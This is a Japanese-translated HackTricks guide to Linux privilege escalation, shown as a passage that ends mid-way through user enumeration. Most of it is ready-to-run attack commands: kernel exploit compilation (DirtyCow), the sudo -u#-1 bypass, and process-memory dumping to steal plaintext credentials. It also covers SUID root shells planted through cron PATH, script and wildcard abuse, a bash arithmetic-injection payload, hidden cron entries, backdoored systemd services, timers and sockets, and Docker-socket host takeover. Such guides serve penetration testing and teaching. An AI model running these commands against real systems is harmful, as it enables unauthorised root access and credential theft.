# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS 情報

稼働中のOSについての情報収集を始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もし**`PATH`変数内の任意のフォルダに書き込み権限がある**場合、いくつかのライブラリやバイナリをハイジャックできる可能性があります:
```bash
echo $PATH
```
### 環境情報

環境変数に興味深い情報やパスワード、APIキーは含まれていますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel versionを確認し、exploitがescalate privilegesに使えるか確認する
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱な kernel のリストといくつかの既に **compiled exploits** は次で見つけられます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) および [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
他にも **compiled exploits** を入手できるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

その web から脆弱な kernel バージョンをすべて抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits を検索するのに役立つツールは次のとおりです:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（victim上で実行、kernel 2.x 向けの exploit のみをチェック）

常に **Google で kernel version を検索してください**。あなたの kernel version が既知の exploit に記載されている場合があり、その場合その exploit が有効であることを確認できます。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

以下に表示される脆弱な sudo バージョンに基づいて:
```bash
searchsploit sudo
```
この grep を使って sudo のバージョンが脆弱かどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

提供: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg の署名検証に失敗

**smasher2 box of HTB** を確認して、この vuln がどのように悪用され得るかの **例** を参照してください
```bash
dmesg 2>/dev/null | grep "signature"
```
### 追加のシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策を列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もし docker container の中にいる場合、そこから脱出を試みることができます:

{{#ref}}
docker-security/
{{#endref}}

## ドライブ

何が**マウントされているか／されていないか**、どこにあり、なぜそうなっているのかを確認してください。もし何かがアンマウントされている場合は、それをマウントして個人情報がないか確認してみてください。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用な binaries を列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**any compiler is installed** がインストールされているか確認してください。これは、いくつかの kernel exploit を使用する必要がある場合に役立ちます。実行するマシン（またはそれに類似したマシン）上でコンパイルすることが推奨されているからです。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアがインストールされている

**インストールされているパッケージやサービスのバージョン**を確認してください。例えば、古いNagiosのバージョンが存在し、権限昇格に悪用される可能性があります…\  
疑わしいソフトウェアについては、インストールされているバージョンを手動で確認することを推奨します。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
マシンにSSHでアクセスできる場合、マシン内にインストールされている古く脆弱なソフトウェアをチェックするために、**openVAS** を使用することもできます。

> [!NOTE] > _これらのコマンドは大量の情報を表示し、その多くはほとんど役に立たないことに注意してください。したがって、インストールされているソフトウェアのバージョンが既知の exploits に対して脆弱かどうかをチェックする OpenVAS のようなアプリケーションを使用することを推奨します_

## プロセス

どの**プロセス**が実行されているかを確認し、どのプロセスが**本来より多くの権限を持っている**かをチェックしてください（例えば tomcat が root によって実行されているかもしれません）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** はプロセスのコマンドライン内の `--inspect` パラメータをチェックしてそれらを検出します。\
また、**プロセスの binaries に対する権限も確認してください**。誰かのバイナリを上書きできるかもしれません。

### Process monitoring

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使ってプロセスを監視できます。これは、頻繁に実行される、あるいは特定の条件が満たされたときに脆弱なプロセスを特定するのに非常に有用です。

### Process memory

一部のサービスはサーバーのメモリ内に**認証情報を平文で保存**します。\
通常、他のユーザーに属するプロセスのメモリを読み取るには **root privileges** が必要になるため、これは一般的に既に root の場合にさらに認証情報を発見するために有用です。\
しかし、**通常のユーザーとしては自分が所有するプロセスのメモリを読むことができる**ことを忘れないでください。

> [!WARNING]
> 最近のほとんどのマシンではデフォルトで **ptrace を許可していない** ため、権限のないユーザーが所有する他プロセスをダンプできない点に注意してください。
>
> ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ は ptrace のアクセス性を制御します:
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid であればすべてのプロセスをデバッグ可能。これは従来の ptrace の動作です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみデバッグ可能。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE が必要となり、管理者のみが ptrace を使用可能。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはなし。設定後に再起動が必要でないと ptrace を有効にできません。

#### GDB

FTP サービスなどのメモリにアクセスできる場合、Heap を取得してその中の認証情報を検索できるかもしれません。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセスIDについて、**maps は当該プロセスの仮想アドレス空間内でメモリがどのようにマップされているかを示し**、各マップ領域の**アクセス権（permissions）も表示します**。擬似ファイル **mem** は**プロセス自身のメモリ本体を公開します**。**maps** ファイルから、どの**メモリ領域が読み取り可能（readable）か**とそのオフセットが分かります。この情報を使って、**mem ファイル内をシークし、読み取り可能なすべての領域をダンプして**ファイルに保存します。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem`はシステムの**物理**メモリへのアクセスを提供し、仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使用してアクセスできます。\  
通常、`/dev/mem`は**root**およびkmemグループのみが読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、Windows用のSysinternalsツールスイートにある定番ProcDumpツールをLinux向けに再構想したものです。入手は[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次を使用できます:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root 要件を手動で削除して、あなたが所有するプロセスをダンプできます
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root が必要)

### プロセスのメモリからの認証情報

#### 手動の例

authenticator プロセスが実行されている場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプして（プロセスのメモリをダンプするさまざまな方法は前のセクションを参照）メモリ内の認証情報を検索できます:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) はメモリから**平文の資格情報を盗み**、いくつかの**既知のファイル**からも取得します。正常に動作するにはroot権限が必要です。

| 機能                                              | プロセス名             |
| ------------------------------------------------- | ---------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password           |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon   |
| LightDM (Ubuntu Desktop)                          | lightdm                |
| VSFTPd (Active FTP Connections)                   | vsftpd                 |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2                |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                  |

#### 検索用正規表現/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## スケジュール/Cron ジョブ

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

もし web の “Crontab UI” パネル (alseambusher/crontab-ui) が root として動作し、loopback にのみバインドされている場合でも、SSH のローカルポートフォワーディングでアクセスして特権ジョブを作成し権限昇格できます。

典型的な手順
- `ss -ntlp` / `curl -v localhost:8000` を使って、loopback のみのポート（例: 127.0.0.1:8000）と Basic-Auth realm を発見する
- 運用アーティファクトから認証情報を見つける:
- バックアップ/スクリプト（`zip -P <password>` を使用）
- systemd ユニットが `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` を公開している
- トンネルしてログイン:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限のジョブを作成して直ちに実行する (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```
ハードニング
- Crontab UI を root で実行しない; 専用ユーザーと最小限の権限で制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する; パスワードを使い回さない
- unit files にシークレットを埋め込まない; secret stores または root のみアクセス可能な EnvironmentFile を使用する
- オンデマンドのジョブ実行に対して audit/logging を有効にする

スケジュールされたジョブが脆弱かどうか確認する。root によって実行されるスクリプトを利用できるかもしれない（wildcard vuln? root が使用するファイルを変更できるか? use symlinks? root が使用するディレクトリに特定のファイルを作成する?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron パス

例えば、_/etc/crontab_ の中に PATH を見つけることができます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー "user" が /home/user に書き込み権限を持っていることに注意_)

この crontab 内で root が PATH を設定せずにコマンドやスクリプトを実行しようとする場合。例えば: _\* \* \* \* root overwrite.sh_\  
すると、次のようにして root シェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron がワイルドカードを含むスクリプトを使用している場合 (Wildcard Injection)

スクリプトが root によって実行され、コマンド内に “**\***” が含まれている場合、これを悪用して意図しない動作（例えば privesc）を引き起こすことができます。例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**ワイルドカードが次のようなパスの前にある場合** _**/some/path/\***_ **、脆弱ではありません（_**./\***_ **も脆弱ではありません）。**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash は ((...))、$((...)) および let 内で算術評価を行う前に parameter/variable expansion と command substitution を実行します。もし root の cron/パーサが信頼できないログフィールドを読み取りそれを算術コンテキストに渡すと、攻撃者はコマンド置換 $(...) を注入でき、cron 実行時に root として実行されます。

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: パースされるログに攻撃者制御のテキストを書き込み、数値に見えるフィールドがコマンド置換 $(...) を含み末尾が数字になるようにします。算術式が有効になるように、コマンドが stdout に出力しない（またはリダイレクトする）ことを確認してください。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

root によって実行される **cron script を修正できる** なら、非常に簡単に shell を取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
root によって実行されるスクリプトがあなたが完全にアクセスできる **ディレクトリ** を使用している場合、そのフォルダを削除して、あなたが制御するスクリプトを置いた別のフォルダへの **シンボリックリンクフォルダを作成する** ことが有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 頻繁に実行される cron jobs

1、2、5 分ごとに実行されている processes を探すために監視できます。場合によってはそれを利用して privileges を escalate できるかもしれません。

例えば、**1 分間 0.1 秒ごとに監視する**、**実行回数の少ないコマンドでソートする**、そして最も多く実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**次のツールも使用できます** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これは開始されるすべてのプロセスを監視して一覧表示します).

### 見えない cron jobs

コメントの後に**キャリッジリターンを入れる**（改行文字なし）ことで cronjob を作成でき、cron job は動作します。例（キャリッジリターン文字に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込みできるか確認してください。可能であれば、**変更**してサービスが**開始**、**再起動**、または**停止**されたときにあなたの**backdoor**を**実行**するようにできます（マシンを再起動するまで待つ必要があるかもしれません）。\
例えば、`.service` ファイル内にあなたの backdoor を作成し、**`ExecStart=/tmp/script.sh`** を指定します。

### 書き込み可能な service バイナリ

サービスによって実行されるバイナリに対して**write permissions over binaries being executed by services**がある場合、それらを backdoor に置き換えることで、サービスが再実行されたときに backdoor が実行されます。

### systemd PATH - 相対パス

次のコマンドで**systemd**が使用する PATH を確認できます:
```bash
systemctl show-environment
```
パス内の任意のフォルダに**write**できることが分かった場合、**escalate privileges**できる可能性があります。サービス設定ファイルで**relative paths being used on service configurations**のような記述を検索する必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能な systemd の PATH フォルダ内に、相対パスのバイナリと同じ名前の**実行可能ファイル**を作成し、サービスが脆弱なアクション（**Start**、**Stop**、**Reload**）を実行するよう要求されると、あなたの**バックドアが実行されます**（通常、権限のないユーザーはサービスの開始/停止を実行できませんが、`sudo -l` が使えるか確認してください）。

**サービスについては `man systemd.service` を参照してください。**

## **タイマー**

**タイマー**は名前が `**.timer**` で終わる systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。**タイマー**はカレンダー時間イベントや単調時間イベントをネイティブにサポートし、非同期で実行できるため、cron の代替として使用できます。

すべてのタイマーは次のコマンドで列挙できます:
```bash
systemctl list-timers --all
```
### 書き込み可能な timers

もし timer を変更できるなら、systemd.unit の既存のユニット（例えば `.service` や `.target`）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントには Unit が何か次のように書かれています:

> このタイマーが満了したときに起動される unit。引数は接尾辞が ".timer" でない unit 名です。指定されない場合、この値はタイマー unit と同じ名前（接尾辞を除く）を持つ service にデフォルトされます。（上記参照。）起動される unit 名とタイマー unit の unit 名は、接尾辞を除いて同一にすることが推奨されます。

したがって、この権限を悪用するには次のことが必要です:

- systemd unit（例: `.service`）のうち、**書き込み可能なバイナリを実行している**ものを見つける
- 相対パスを実行している systemd unit を見つけ、かつ **systemd PATH** に対して**書き込み権限**がある（その実行ファイルを偽装するため）

**`man systemd.timer` でタイマーについて詳しく学べます。**

### **タイマーの有効化**

タイマーを有効化するには root 権限が必要で、次を実行します:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## ソケット

Unix Domain Sockets (UDS) はクライアント-サーバモデル内で同一または別のマシン間での**プロセス間通信**を可能にします。これらは標準的な Unix ディスクリプタファイルを利用してコンピュータ間の通信を行い、`.socket` ファイルを通じて設定されます。

ソケットは `.socket` ファイルを使用して設定できます。

**Learn more about sockets with `man systemd.socket`.** このファイル内では、いくつかの興味深いパラメータを設定できます:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは種類が異なりますが、要約するとソケットがどこでリッスンするか（AF_UNIX ソケットファイルのパス、IPv4/6 および/またはリッスンするポート番号など）を**示す**ために使われます。
- `Accept`: ブール引数を取ります。`true` の場合、**受信ごとに service インスタンスが生成され**、接続ソケットのみがそのインスタンスに渡されます。`false` の場合、すべてのリスニングソケット自体が**起動された service ユニットに渡され**、すべての接続に対して単一の service ユニットのみが生成されます。この値はデータグラムソケットや FIFO では無視され、これらでは単一の service ユニットが無条件にすべての受信トラフィックを処理します。**デフォルトは false**です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法で実装することが推奨されます。
- `ExecStartPre`, `ExecStartPost`: 1つ以上のコマンドラインを取り、それぞれリスニング **ソケット**/FIFOs が**作成**およびバインドされる前または後に**実行**されます。コマンドラインの最初のトークンは絶対パスのファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リスニング **ソケット**/FIFOs がクローズされ削除される前または後にそれぞれ**実行**される追加の**コマンド**です。
- `Service`: **incoming traffic** に対して**アクティブ化する** `service` ユニット名を指定します。この設定は `Accept=no` のソケットでのみ許可されます。デフォルトではソケットと同じ名前の service（サフィックスが置き換えられたもの）が使用されます。ほとんどの場合、このオプションを使用する必要はありません。

### 書き込み可能な .socket ファイル

もし **書き込み可能な** `.socket` ファイルを見つけたら、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**できます。そうすれば backdoor はソケットが作成される前に実行されます。したがって、**おそらくマシンの再起動を待つ必要があるでしょう。**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### 書き込み可能なソケット

もし **書き込み可能なソケット** を識別したら（ここでは設定ファイルの `.socket` ではなく Unix ソケットのことを指します）、そのソケットと**通信**でき、脆弱性を悪用できる可能性があります。

### Unix ソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Note that there may be some **sockets listening for HTTP** requests (_.socket files のことではなく、unix sockets として動作するファイルについて話しています_). これを確認するには:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
ソケットが **HTTP リクエストに応答する** 場合、**通信** が可能になり、場合によっては **脆弱性を悪用** できることがあります。

### 書き込み可能な Docker ソケット

Docker ソケット（多くの場合 `/var/run/docker.sock` にあります）は、保護すべき重要なファイルです。デフォルトでは `root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込み権を持つことは privilege escalation に繋がる可能性があります。以下に、この方法がどのように行われるか、および Docker CLI が利用できない場合の代替手段を示します。

#### **Privilege Escalation with Docker CLI**

Docker ソケットへの書き込みアクセスがある場合、以下のコマンドを使って privilege escalation が可能です:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドは、ホストのファイルシステムに対して root 権限でアクセスできるコンテナを実行することを可能にします。

#### **Docker API を直接使用する場合**

Docker CLI が利用できない場合でも、Docker ソケットは Docker API と `curl` コマンドを使って操作できます。

1.  **List Docker Images:** 利用可能なイメージの一覧を取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ホストのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

作成したコンテナを起動します:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` を使ってコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` 接続を設定した後、コンテナ内でホストのファイルシステムに対する root 権限で直接コマンドを実行できます。

### Others

docker ソケットに対して書き込み権限がある（**group `docker` に属している**）場合は、[**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) が存在することに注意してください。もし [**docker API がポートで待ち受けている** と、そちらを侵害できる可能性もあります](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

以下で、docker からの脱出や悪用による権限昇格のさらに多くの方法を確認してください：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

もし **`ctr`** コマンドを使用できることが判明した場合、以下のページを参照してください。**権限昇格に悪用できる可能性があります**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

もし **`runc`** コマンドを使用できることが判明した場合、以下のページを参照してください。**権限昇格に悪用できる可能性があります**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な **inter-Process Communication (IPC) system** で、アプリケーション同士が効率的にやり取りやデータ共有を行えるようにします。モダンな Linux システムを念頭に設計されており、さまざまな形態のアプリケーション間通信に対して堅牢なフレームワークを提供します。

このシステムは多用途で、プロセス間のデータ交換を強化する基本的な IPC をサポートしており、拡張された UNIX domain sockets に似た役割を果たします。さらに、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetooth デーモンからの着信に関するシグナルがミュージックプレーヤーにミュートを促す、などのユーザー体験向上が可能です。加えて、D-Bus はリモートオブジェクトシステムをサポートしており、サービス要求やメソッド呼び出しを簡素化して、従来は複雑だったプロセスを合理化します。

D-Bus は **allow/deny model** に基づいて動作し、ポリシールールのマッチの累積的効果に基づいてメッセージ権限（メソッド呼び出し、シグナル送出など）を管理します。これらのポリシーはバスとのやり取りを指定し、これらの権限を悪用することで権限昇格が発生する可能性があります。

例として、/etc/dbus-1/system.d/wpa_supplicant.conf にあるポリシーが挙げられます。これは root ユーザーが fi.w1.wpa_supplicant1 を所有し、送信し、受信する権限を持つことを詳細に示しています。

ユーザーやグループが指定されていないポリシーは普遍的に適用され、"default" コンテキストのポリシーは他の特定のポリシーでカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus communication を enumerate と exploit する方法を学んでください：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を特定するのはいつも興味深い。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 開いているポート

アクセスする前に操作できなかったマシン上で動作しているネットワークサービスは常に確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

traffic を sniff できるか確認してください。できれば、いくつかの credentials を取得できる可能性があります。
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

自分が**who**で、どの**privileges**を持っているか、システムにどの**users**が存在し、どのアカウントが**login**でき、どのアカウントが**root privileges**を持っているかを確認してください:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
